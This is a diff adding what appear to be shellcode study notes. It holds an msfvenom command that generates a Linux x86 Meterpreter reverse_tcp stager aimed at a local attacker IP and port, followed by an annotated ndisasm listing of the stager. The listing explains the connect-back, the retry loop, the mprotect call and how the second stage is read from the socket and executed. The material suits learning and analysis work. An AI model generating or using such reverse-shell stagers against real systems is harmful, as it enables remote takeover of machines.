@@ -1,0 +1,63 @@
+1. msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=4444 -f raw > meter_revtcp.bin
+2. ndisasm -u meter_revtcp.bin
+--
+00000000  6A0A              push byte +0xa
+00000002  5E                pop esi			; place 10 in esi
+00000003  31DB              xor ebx,ebx			; nullify ebx
+00000005  F7E3              mul ebx
+00000007  53                push ebx			; push 0
+00000008  43                inc ebx			; 1 in ebx
+00000009  53                push ebx			; push 1
+0000000A  6A02              push byte +0x2		; push 2
+0000000C  B066              mov al,0x66			; mov socketcall
+0000000E  89E1              mov ecx,esp			; address of argument
+00000010  CD80              int 0x80			; calling socketcall() with socket()
+00000012  97                xchg eax,edi		; place sockfd in edi
+00000013  5B                pop ebx			; in ebx 1
+00000014  68C0A80066        push dword 0x6600a8c0	; place IPv4 address connect to
+00000019  680200115C        push dword 0x5c110002	; place port and proto family
+0000001E  89E1              mov ecx,esp
+00000020  6A66              push byte +0x66
+00000022  58                pop eax			; socketcall()
+00000023  50                push eax
+00000024  51                push ecx			; addresss of sockaddr_in structure
+00000025  57                push edi			; sockfd
+00000026  89E1              mov ecx,esp			; address of arguments
+00000028  43                inc ebx
+00000029  CD80              int 0x80			; call connect()
+0000002B  85C0              test eax,eax		; 
+0000002D  7919              jns 0x48			; if connect successful - jmp
+0000002F  4E                dec esi			; in esi 10 - number of attempts to connect
+00000030  743D              jz 0x6f			; if zero attempts left - exit
+00000032  68A2000000        push dword 0xa2
+00000037  58                pop eax
+00000038  6A00              push byte +0x0
+0000003A  6A05              push byte +0x5
+0000003C  89E3              mov ebx,esp
+0000003E  31C9              xor ecx,ecx
+00000040  CD80              int 0x80			; wait 5 seconds
+00000042  85C0              test eax,eax
+00000044  79BD              jns 0x3
+00000046  EB27              jmp short 0x6f
+00000048  B207              mov dl,0x7			; mov dl 7 - read, write, execute for mprotect() memory area
+0000004A  B900100000        mov ecx,0x1000		; 4096 bytes
+0000004F  89E3              mov ebx,esp
+00000051  C1EB0C            shr ebx,byte 0xc
+00000054  C1E30C            shl ebx,byte 0xc		; nullify 12 lowest bits
+00000057  B07D              mov al,0x7d			; mprotect syscall
+00000059  CD80              int 0x80
+0000005B  85C0              test eax,eax
+0000005D  7810              js 0x6f			; if no success with mprotect -> exit
+0000005F  5B                pop ebx			; if success put sockfd in ebx
+00000060  89E1              mov ecx,esp
+00000062  99                cdq
+00000063  B60C              mov dh,0xc
+00000065  B003              mov al,0x3			; read data from socket
+00000067  CD80              int 0x80
+00000069  85C0              test eax,eax
+0000006B  7802              js 0x6f
+0000006D  FFE1              jmp ecx			; jmp to 2nd part of shell
+0000006F  B801000000        mov eax,0x1
+00000074  BB01000000        mov ebx,0x1
+00000079  CD80              int 0x80
+
